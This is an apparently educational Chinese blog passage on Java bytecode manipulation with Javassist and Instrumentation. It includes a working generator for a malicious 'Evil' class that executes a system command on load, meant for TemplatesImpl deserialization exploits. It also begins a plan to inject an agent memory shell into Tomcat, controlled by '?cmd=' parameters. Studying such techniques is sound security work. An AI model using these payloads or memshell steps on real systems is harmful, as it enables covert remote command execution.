java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ClassPool.get(ClassName)<br></code></pre></td></tr></table></figure><h4 id="CtMethod-和-CtField"><a href="#CtMethod-和-CtField" class="headerlink" title="CtMethod 和 CtField"></a>CtMethod 和 CtField</h4><p>CtMethod 和 CtField 分别代表 Java 类中的方法和字段。通过 CtClass 对象，可以获取、添加、删除或修改类中的方法和字段。这些对象提供了丰富的 API ，用于操作方法和字段的各种属性，如访问修饰符、名称、返回类型等。</p><p>CtMethod 中的一些重要方法：</p><ol><li>insertBefore：在方法的起始位置插入代码。</li><li>insterAfter：在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到 exception 。</li><li>insertAt：在指定的位置插入代码。</li><li>setBody：将方法的内容设置为要写入的代码，当方法被 abstract 修饰时，该修饰符被移除。</li><li>make：创建一个新的方法。</li></ol><p>利用 CtMethod 中的 insertBefore，insterAfter，insertAt 等方法可以实现 AOP 增强功能。</p><p>通过<code>CtClass.getDeclaredMethod(MethodName)</code>获取，其中该类提供了一些方法可以让我们直接修改方法体，方法如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CtMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">CtBehavior</span> &#123;<br>    <br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CtBehavior</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">CtMethod</span> &#123;<br>    <span class="hljs-comment">//设置方法体</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBody</span><span class="hljs-params">(String src)</span>;<br><br>    <span class="hljs-comment">// 插入在方法体最前面</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertBefore</span><span class="hljs-params">(String src)</span>;<br> <br>    <span class="hljs-comment">// 插入在方法体最后面</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertAfter</span><span class="hljs-params">(String src)</span>;<br> <br>    <span class="hljs-comment">// 在方法体的某一行插入内容</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">insertAt</span><span class="hljs-params">(<span class="hljs-type">int</span> lineNum, String src)</span>;<br> <br>&#125;<br>    <br></code></pre></td></tr></table></figure><p>其中传递给<code>insertBefore</code>、<code>insertAfter</code>和<code>insertAt</code>的String对象是由<code>Javassist</code>的编译器进行编译的。该编译器支持语言的扩展，以下以$符号开头的几个标识符具有特殊的含义：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524285.png" alt="img"></p><h4 id="Javassist-使用"><a href="#Javassist-使用" class="headerlink" title="Javassist 使用"></a>Javassist 使用</h4><p>依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.27.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用 javassist 创建一个 Person 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavassistDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">CreatePerson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//获取 CtClass 对象容器 ClassPool</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-comment">//创建一个新类 Javassist.Learning.Person</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;javassist.Person&quot;</span>);<br>        <span class="hljs-comment">//创建一个 Person 类的属性 name</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">ctField1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>),<span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        <span class="hljs-comment">//设置属性访问符</span><br>        ctField1.setModifiers(Modifier.PRIVATE);<br>        <span class="hljs-comment">//将属性添加到 Person中，并设置初始值</span><br>        ctClass.addField(ctField1,CtField.Initializer.constant(<span class="hljs-string">&quot;aaa&quot;</span>));<br><br>        <span class="hljs-comment">//向 Person 类中添加 setter 和 getter 方法</span><br>        ctClass.addMethod(CtNewMethod.setter(<span class="hljs-string">&quot;setName&quot;</span>,ctField1));<br>        ctClass.addMethod(CtNewMethod.getter(<span class="hljs-string">&quot;getName&quot;</span>,ctField1));<br><br>        <span class="hljs-comment">//创建一个无参构造</span><br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">ctConstructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, ctClass);<br>        <span class="hljs-comment">//设置方法体</span><br>        ctConstructor.setBody(<span class="hljs-string">&quot;&#123;name = \&quot;aaa\&quot;;&#125;&quot;</span>);<br>        <span class="hljs-comment">//向 Person 类中添加无参构造</span><br>        ctClass.addConstructor(ctConstructor);<br><br>        <span class="hljs-comment">//创建一个类方法 printName</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;printName&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, ctClass);<br>        <span class="hljs-comment">//设置方法访问符</span><br>        ctMethod.setModifiers(Modifier.PUBLIC);<br>        <span class="hljs-comment">//设置方法体</span><br>        ctMethod.setBody(<span class="hljs-string">&quot;&#123;System.out.println(\&quot;Hello World\&quot;);&#125;&quot;</span>);<br>        <span class="hljs-comment">//将方法添加至 Person 中</span><br>        ctClass.addMethod(ctMethod);<br><br>        <span class="hljs-comment">//将生成的字节码写入文件中</span><br>        ctClass.writeFile();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;start&quot;</span>);<br>        CreatePerson();<br>        System.out.println(<span class="hljs-string">&quot;finish&quot;</span>);<br>    &#125;<br>&#125;<br><br> <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523506.png" alt="img"></p><p>创建好的 Person.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> javassist;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;aaa&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String var1)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = var1;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;aaa&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello World&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="使用Javassist生成恶意class"><a href="#使用Javassist生成恶意class" class="headerlink" title="使用Javassist生成恶意class"></a>使用Javassist生成恶意class</h4><p>从字节码层面生成恶意 class ，跳过恶意类的编译过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.javassist;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">createShell</span> &#123;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 生成包含恶意命令的TemplatesImpl字节码</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cmd 要执行的系统命令</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 生成的字节码数组</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplatesImpl(String cmd) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 获取默认的类池</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <br>            <span class="hljs-comment">// 创建一个新的类，名为&quot;Evil&quot;</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>            <br>            <span class="hljs-comment">// 获取AbstractTranslet类作为父类</span><br>            <span class="hljs-comment">// 这是XSLT转换器的基类，常用于Java反序列化利用</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>            ctClass.setSuperclass(superClass);<br>            <br>            <span class="hljs-comment">// 创建类的初始化构造函数</span><br>            <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">ctConstructor</span> <span class="hljs-operator">=</span> ctClass.makeClassInitializer();<br>            <br>            <span class="hljs-comment">// 在构造函数体中插入执行系统命令的代码</span><br>            ctConstructor.setBody(<span class="hljs-string">&quot;try&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;            Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="hljs-string">&quot;\&quot;);\n&quot;</span> +  <span class="hljs-comment">// 执行传入的命令</span><br>                    <span class="hljs-string">&quot;        &#125;catch (Exception e)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;        &#125;&quot;</span>);  <span class="hljs-comment">// 异常处理，静默失败</span><br>            <br>            <span class="hljs-comment">// 将CtClass转换为字节数组</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <br>            <span class="hljs-comment">// 从类池中分离该类，释放资源</span><br>            ctClass.detach();<br>            <br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;&#125;;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 将生成的恶意类字节码写入文件</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeShell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 生成执行calc命令的恶意字节码</span><br>        <span class="hljs-type">byte</span>[] shell = createShell.getTemplatesImpl(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <br>        <span class="hljs-comment">// 创建文件输出流，将字节码写入bbb.class文件</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;bbb.class&quot;</span>));<br>        fileOutputStream.write(shell);<br>        <br>        <span class="hljs-comment">// 注意：这里应该关闭流，建议使用try-with-resources</span><br>        fileOutputStream.close();<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 主方法 - 程序入口</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> args 命令行参数</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        writeShell();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523107.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var1) &#123;<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-2-2-Instrumentation-动态修改字节码"><a href="#4-2-2-Instrumentation-动态修改字节码" class="headerlink" title="4.2.2 Instrumentation 动态修改字节码"></a>4.2.2 Instrumentation 动态修改字节码</h3><p> Instrumentation是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。  </p><p> 其在Java中是一个接口，常用方法如下  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Instrumentation</span> &#123;<br>    <br>    <span class="hljs-comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-type">boolean</span> canRetransform)</span>;<br> <br>    <span class="hljs-comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br>    <span class="hljs-comment">//删除一个类转换器</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">removeTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br> <br>    <span class="hljs-comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">retransformClasses</span><span class="hljs-params">(Class&lt;?&gt;... classes)</span> <span class="hljs-keyword">throws</span> UnmodifiableClassException;<br> <br>    <span class="hljs-comment">//判断一个类是否被修改</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isModifiableClass</span><span class="hljs-params">(Class&lt;?&gt; theClass)</span>;<br> <br>    <span class="hljs-comment">// 获取目标已经加载的类。</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span><br>    Class[] getAllLoadedClasses();<br> <br>    <span class="hljs-comment">//获取一个对象的大小</span><br>    <span class="hljs-type">long</span> <span class="hljs-title function_">getObjectSize</span><span class="hljs-params">(Object objectToSize)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="获取目标JVM已加载类"><a href="#获取目标JVM已加载类" class="headerlink" title="获取目标JVM已加载类"></a>获取目标JVM已加载类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Java_Agent_agentmain_Instrumentation</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args,  Instrumentation inst)</span> <span class="hljs-keyword">throws</span> InterruptedException&#123;<br>        Class[] classes = inst.getAllLoadedClasses();<br><br>        <span class="hljs-keyword">for</span>(Class cls : classes)&#123;<br>            System.out.println(<span class="hljs-string">&quot;=======================&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;加载类：&quot;</span> + cls.getName());<br>            System.out.println(<span class="hljs-string">&quot;是否可被修改：&quot;</span> + inst.isModifiableClass(cls));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Agent-Class: com.test.Java_Agent_agentmain_Instrumentation<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Can-Set-Native-Method-Prefix: true<br></code></pre></td></tr></table></figure><p>创建 jar</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">jar cvfm Instrumentation.jar ..\src\main\resources\MANIFEST.MF .\Java_Agent_agentmain_Instrumentation.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081533461.png" alt="img"></p><p>使用 InjectAgent.java 测试</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524580.png" alt="img"></p><p> 能够获取目标JVM已加载类</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523648.png" alt="img"></p><h4 id="transform-转换器"><a href="#transform-转换器" class="headerlink" title="transform - 转换器"></a>transform - 转换器</h4><p>在Instrumentation接口中，我们可以通过**addTransformer()**来添加一个transformer（转换器），关键属性就是ClassFileTransformer类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-type">boolean</span> canRetransform)</span>;<br></code></pre></td></tr></table></figure><p><strong>ClassFileTransformer</strong>接口中只有一个**transform()**方法，返回值为字节数组，作为转换后的字节码注入到目标JVM中。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523698.png" alt="img"></p><p>在通过 addTransformer 注册一个transformer后，每次定义或者重定义新类都会调用transformer。所谓定义，即是通过ClassLoader.defineClass加载进来的类。而重定义是通过Instrumentation.redefineClasses方法重定义的类。</p><p>当存在多个转换器时，转换将由 transform 调用链组成。 也就是说，一个 transform 调用返回的 byte 数组将成为下一个调用的输入（通过 classfileBuffer 参数）。</p><p>转换将按以下顺序应用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">不可重转换转换器<br>不可重转换本机转换器<br>可重转换转换器<br>可重转换本机转换器<br></code></pre></td></tr></table></figure><p>至于transformer中对字节码的具体操作，则需要使用到Javassisit类。</p><h4 id="Instrumentation的局限性"><a href="#Instrumentation的局限性" class="headerlink" title="Instrumentation的局限性"></a>Instrumentation的局限性</h4><p>大多数情况下，我们使用Instrumentation都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：</p><p>premain和agentmain两种方式修改字节码的时机都是类文件加载之后，也就是说必须要带有Class类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。</p><p>类的字节码修改称为类转换(Class Transform)，类转换其实最终都回归到类重定义I<code>nstrumentation#redefineClasses</code>方法，此方法有以下限制：</p><ol><li>新类和老类的父类必须相同</li><li>新类和老类实现的接口数也要相同，并且是相同的接口</li><li>新类和老类访问符必须一致。 新类和老类字段数和字段名要一致</li><li>新类和老类新增或删除的方法必须是private static&#x2F;final修饰的</li><li>可以修改方法体</li></ol><h2 id="4-3-Agent-内存马注入"><a href="#4-3-Agent-内存马注入" class="headerlink" title="4.3 Agent 内存马注入"></a>4.3 Agent 内存马注入</h2><p>看了许多师傅关于Agent内存马注入的文章和博客，各有千秋，利用方式也各不相同。现在，我根据自己的理解来编写一个小demo。</p><h3 id="4-3-1-方式一（后续可能会复现其他师傅的利用方式）"><a href="#4-3-1-方式一（后续可能会复现其他师傅的利用方式）" class="headerlink" title="4.3.1 方式一（后续可能会复现其他师傅的利用方式）"></a>4.3.1 方式一（后续可能会复现其他师傅的利用方式）</h3><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><ol><li>编译并打包 <code>AgentMemShell</code> 为 <code>agentmemshell.jar</code>。</li><li>编译 <code>Injector</code>（需要 <code>tools.jar</code>，通常在 <code>JAVA_HOME/lib/</code> 下）。</li><li>运行 <code>Injector</code>，指定目标 Tomcat 的 PID。</li><li>访问任何 Servlet 路径，带上 <code>?cmd=whoami</code> 